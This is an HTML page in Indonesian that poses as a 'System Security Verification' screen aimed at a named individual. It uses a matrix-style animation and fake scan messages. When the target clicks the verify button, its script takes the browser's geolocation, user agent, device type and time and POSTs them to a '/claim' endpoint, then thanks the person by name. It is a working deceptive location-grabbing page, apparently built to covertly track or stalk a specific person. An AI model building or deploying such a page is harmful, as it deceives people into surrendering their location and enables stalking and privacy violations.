<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="System Security Verification Interface">
    <title>System Security Verification</title>

    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=VT323&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">

    <style>
        :root {
            --primary-gradient: linear-gradient(135deg, #1a1a1a, #2d2d2d);
            --accent-color: #00ff00;
            --error-color: #ff3333;
            --text-primary: #e0e0e0;
            --container-bg: rgba(25, 25, 25, 0.95);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--text-primary);
            position: relative;
            overflow: hidden;
        }

        #matrix-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .glitch-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 2;
            animation: glitch 2s infinite;
            background: linear-gradient(45deg, 
                transparent 0%, 
                rgba(32, 226, 215, 0.05) 30%, 
                rgba(255, 0, 0, 0.05) 50%, 
                transparent 70%
            );
            mix-blend-mode: overlay;
        }

        @keyframes glitch {
            0% { transform: translate(0) }
            20% { transform: translate(-2px, 2px) }
            40% { transform: translate(-2px, -2px) }
            60% { transform: translate(2px, 2px) }
            80% { transform: translate(2px, -2px) }
            100% { transform: translate(0) }
        }

        .container {
            background: var(--container-bg);
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            width: 420px;
            position: relative;
            z-index: 10;
            border: 1px solid rgba(0, 255, 0, 0.1);
        }

        .security-header {
            display: flex;
            align-items: center;
            gap: 1rem;
            margin-bottom: 2rem;
        }

        .security-icon {
            font-size: 2.5rem;
            color: var(--accent-color);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        h1 {
            font-size: 1.5rem;
            font-weight: 600;
            font-family: 'JetBrains Mono', monospace;
        }

        .status-container {
            background: rgba(0, 0, 0, 0.3);
            padding: 1rem;
            border-radius: 10px;
            margin: 1.5rem 0;
            border: 1px solid rgba(0, 255, 0, 0.1);
        }

        .status-text {
            text-align: center;
        }

        .verify-btn {
            width: 100%;
            padding: 1rem;
            background: transparent;
            color: var(--accent-color);
            border: 2px solid var(--accent-color);
            border-radius: 10px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .verify-btn:hover {
            background: var(--accent-color);
            color: #000;
        }

        .loading-container {
            display: none;
            margin-top: 20px;
        }

        .cyber-spinner {
            width: 50px;
            height: 50px;
            margin: 0 auto;
            border: 3px solid transparent;
            border-top-color: var(--accent-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            position: relative;
        }

        .cyber-spinner::before,
        .cyber-spinner::after {
            content: '';
            position: absolute;
            border: 3px solid transparent;
            border-radius: 50%;
        }

        .cyber-spinner::before {
            top: -8px;
            left: -8px;
            right: -8px;
            bottom: -8px;
            border-top-color: var(--accent-color);
            animation: spin 2s linear infinite;
        }

        .cyber-spinner::after {
            top: 4px;
            left: 4px;
            right: 4px;
            bottom: 4px;
            border-top-color: var(--accent-color);
            animation: spin 3s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .progress-bar {
            height: 4px;
            background: rgba(0, 255, 0, 0.1);
            margin-top: 20px;
            border-radius: 2px;
            overflow: hidden;
        }

        .progress {
            width: 0%;
            height: 100%;
            background: var(--accent-color);
            transition: width 0.5s ease;
            position: relative;
        }

        .progress::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, 
                transparent, 
                rgba(255, 255, 255, 0.2), 
                transparent);
            animation: shimmer 1.5s infinite;
        }

        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        .loading-text {
            text-align: center;
            margin-top: 10px;
            font-family: 'JetBrains Mono', monospace;
            color: var(--accent-color);
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <canvas id="matrix-canvas"></canvas>
    <div class="glitch-overlay"></div>
    <div class="container">
        <div class="security-header">
            <i class="fas fa-shield-alt security-icon"></i>
            <h1>SYSTEM SECURITY VERIFICATION</h1>
        </div>

        <div class="status-container">
            <div class="status-text" id="statusText">MENUNGGU VERIFIKASI DARI RISMAYANTI MALIK...</div>
        </div>

        <button class="verify-btn" id="verifyBtn">VERIFIKASI SEKARANG</button>

        <div class="loading-container" id="loadingContainer">
            <div class="cyber-spinner"></div>
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
            <div class="loading-text" id="loadingText">INITIATING SECURITY SCAN...</div>
        </div>
    </div>

    <script>
        // Matrix Rain Effect
        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = '#0F0';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        setInterval(drawMatrix, 33);

        // Verification Process
        document.getElementById("verifyBtn").addEventListener("click", function() {
            if (navigator.geolocation) {
                startLoadingAnimation();
                navigator.geolocation.getCurrentPosition(sendLocation, showError);
            } else {
                alert("Geolocation tidak didukung di browser ini.");
            }
        });

        function startLoadingAnimation() {
            const loadingContainer = document.getElementById("loadingContainer");
            const progress = document.getElementById("progress");
            const loadingText = document.getElementById("loadingText");
            const statusText = document.getElementById("statusText");
            const verifyBtn = document.getElementById("verifyBtn");

            loadingContainer.style.display = "block";
            verifyBtn.disabled = true;
            verifyBtn.style.opacity = "0.5";

            const loadingMessages = [
                "INITIATING SECURITY SCAN...",
                "VERIFYING SYSTEM INTEGRITY...",
                "ANALYZING GEOLOCATION DATA...",
                "ESTABLISHING SECURE CONNECTION...",
                "PROCESSING VERIFICATION..."
            ];

            let progress_value = 0;
            const interval = setInterval(() => {
                progress_value += 1;
                progress.style.width = `${progress_value}%`;
                
                if (progress_value % 20 === 0) {
                    loadingText.textContent = loadingMessages[Math.floor(progress_value / 20)];
                }

                if (progress_value >= 100) {
                    clearInterval(interval);
                }
            }, 50);
        }

        function sendLocation(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const userAgent = navigator.userAgent;
            const deviceType = /Mobi|Android/i.test(userAgent) ? "Mobile" : "Desktop";
            const accessTime = new Date().toLocaleString();

            fetch("/claim", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ latitude, longitude, userAgent, deviceType, accessTime })
            })
            .then(response => response.json())
            .then(data => {
                setTimeout(() => {
                    document.getElementById("statusText").innerText = data.message;
                    document.getElementById("loadingContainer").style.display = "none";
                    document.getElementById("verifyBtn").disabled = false;
                    document.getElementById("verifyBtn").style.opacity = "1";
                    document.getElementById("verifyBtn").textContent = "TERIMA KASIH RISMAYANTI MALIK ðŸ˜š";
                }, 5000);
            })
            .catch(error => {
                console.error("Error:", error);
                document.getElementById("statusText").innerText = "Gagal mengirim data.";
                document.getElementById("loadingContainer").style.display = "none";
                document.getElementById("verifyBtn").disabled = false;
                document.getElementById("verifyBtn").style.opacity = "1";
            });
        }

        function showError(error) {
            document.getElementById("statusText").innerText = "Gagal mendapatkan lokasi: " + error.message;
            document.getElementById("loadingContainer").style.display = "none";
            document.getElementById("verifyBtn").disabled = false;
            document.getElementById("verifyBtn").style.opacity = "1";
        }
    </script>
</body>
  </html>
